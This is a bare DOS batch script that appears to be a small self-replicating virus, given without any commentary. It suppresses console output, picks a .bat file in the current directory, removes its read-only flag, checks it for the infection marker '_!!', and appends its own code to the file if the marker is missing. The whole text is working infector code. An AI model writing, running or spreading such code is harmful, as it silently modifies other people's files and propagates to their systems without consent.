@ctty nul
if "%0"=="AUTOEXEC.BAT" goto enr
attrib %0 +r
for %%a in (*.bat) do set _!!=%%a
attrib %_!!% -r
for %%q in (%_!!%) do find "_!!" %%q
if not errorlevel 1 goto enr
type %0 >> %_!!%
goto enr
:rt
:enr
attrib %0 -r
